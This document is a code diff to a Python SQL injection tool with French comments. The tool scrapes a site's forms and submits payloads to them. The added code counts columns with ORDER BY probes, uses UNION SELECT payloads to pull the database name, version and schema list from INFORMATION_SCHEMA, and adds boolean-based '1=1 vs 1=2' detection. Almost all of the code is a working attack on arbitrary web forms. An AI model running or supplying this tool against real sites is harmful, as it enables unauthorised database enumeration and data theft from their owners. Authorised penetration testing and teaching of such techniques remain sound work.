@@ -15,9 +15,35 @@ def get_forms(url):
     soup = BeautifulSoup(response.content, "html.parser")
     return soup.find_all("form")
 
+def get_number_of_columns(url, form_details, method="POST"):
+    for i in range(1, 21):  # Limite à 20 colonnes pour l'exemple
+        payload = f"' ORDER BY {i}-- "
+        response = submit_form(form_details, url, payload, method)
+        if "Unknown column" in response.text or "different number of columns" in response.text:
+            return i - 1
+    return None
+
+# def get_form_details(form):
+#     details = {}
+#     action = form.attrs.get("action").lower()
+#     method = form.attrs.get("method", "get").lower()
+#     inputs = []
+#     for input_tag in form.find_all("input"):
+#         input_type = input_tag.attrs.get("type", "text")
+#         input_name = input_tag.attrs.get("name")
+#         inputs.append({"type": input_type, "name": input_name})
+#     details["action"] = action
+#     details["method"] = method
+#     details["inputs"] = inputs
+#     return details
+
 def get_form_details(form):
     details = {}
-    action = form.attrs.get("action").lower()
+    action = form.attrs.get("action")
+    if action:
+        action = action.lower()
+    else:
+        action = ''
     method = form.attrs.get("method", "get").lower()
     inputs = []
     for input_tag in form.find_all("input"):
@@ -28,6 +54,7 @@ def get_form_details(form):
     details["method"] = method
     details["inputs"] = inputs
     return details
+
 
 def submit_form(form_details, url, payload, method):
     target_url = urljoin(url, form_details["action"])
@@ -43,17 +70,64 @@ def submit_form(form_details, url, payload, method):
         return requests.get(target_url, params=data)
 
 
+def union_based_sql_injection(url, form_details, num_columns, method="POST"):
+    results = {}
+    
+    # Tentative de récupération du nom de la base de données
+    db_payload = f"' UNION SELECT database(), {', '.join(['NULL'] * (num_columns - 1))}-- "
+    db_response = submit_form(form_details, url, db_payload, method)
+    if "database()" in db_response.text.lower():
+        soup = BeautifulSoup(db_response.content, 'html.parser')
+        tables = [td.text for td in soup.find_all("td")]
+        if tables:
+            results["database_name"] = tables[0]
+
+    # Tentative de récupération de la version de la base de données
+    version_payload = f"' UNION SELECT version(), {', '.join(['NULL'] * (num_columns - 1))}-- "
+    version_response = submit_form(form_details, url, version_payload, method)
+    if "version()" in version_response.text.lower():
+        soup = BeautifulSoup(version_response.content, 'html.parser')
+        versions = [td.text for td in soup.find_all("td")]
+        if versions:
+            results["database_version"] = versions[0]
+
+    # Tentative de récupération des bases de données disponibles
+    dbs_payload = f"' UNION SELECT schema_name, {', '.join(['NULL'] * (num_columns - 1))} FROM INFORMATION_SCHEMA.SCHEMATA-- "
+    dbs_response = submit_form(form_details, url, dbs_payload, method)
+    if "schema_name" in dbs_response.text.lower():
+        soup = BeautifulSoup(dbs_response.content, 'html.parser')
+        databases = [td.text for td in soup.find_all("td")]
+        if databases:
+            results["databases"] = databases
+
+    return results
+
+def boolean_based_sql_injection(url, form_details, method="POST"):
+    true_payload = "' AND 1=1--"
+    false_payload = "' AND 1=2--"
+    
+    true_response = submit_form(form_details, url, true_payload, method)
+    false_response = submit_form(form_details, url, false_payload, method)
+    
+    if true_response.text != false_response.text:
+        return True
+    return False
+
 def detect_sql_injection(url, payloads, method):
     forms = get_forms(url)
     results = {
         "url": url,
         "vulnerable": False,
         "payloads": [],
-        "database_name": None
+        "database_name": None,
+        "database_version": None,
+        "databases": []
     }
 
     for form in forms:
         form_details = get_form_details(form)
+        num_columns = get_number_of_columns(url, form_details, method)
+        print(num_columns)
         for payload in payloads:
             method = method.upper()  # Convertit la méthode en majuscules
             response = submit_form(form_details, url, payload, method)
@@ -63,15 +137,16 @@ def detect_sql_injection(url, payloads, method):
                     "payload": payload,
                     "response": response.text
                 })
-                # Tentative de récupération du nom de la base de données
-                db_payload = f"' UNION SELECT database(), {', '.join(['NULL'] * (4 - 1))}-- "
-                db_response = submit_form(form_details, url, db_payload, method)
-                print(db_response.text)
-                if "database()" in db_response.text:
-                    soup = BeautifulSoup(db_response.content, 'html.parser')
-                    tables = [td.text for td in soup.find_all("td")]
-                    if tables:
-                        results["database_name"] = tables[0]
+                if num_columns and num_columns > 0:
+                    union_results = union_based_sql_injection(url, form_details, num_columns, method)
+                    results.update(union_results)
+
+                if boolean_based_sql_injection(url, form_details, method):
+                    results["vulnerable"] = True
+                    results["payloads"].append({
+                        "type": "boolean",
+                        "payload": "1=1 vs 1=2"
+                    })
                 break
         if results["vulnerable"]:
             break
@@ -107,6 +182,10 @@ def main():
         print("The site is vulnerable to SQL injection.")
         if results["database_name"]:
             print(f"Database name: {results['database_name']}")
+        if results["database_version"]:
+            print(f"Database version: {results['database_version']}")
+        if results["databases"]:
+            print(f"Databases: {', '.join(results['databases'])}")
     else:
         print("The site is not vulnerable to SQL injection.")
 
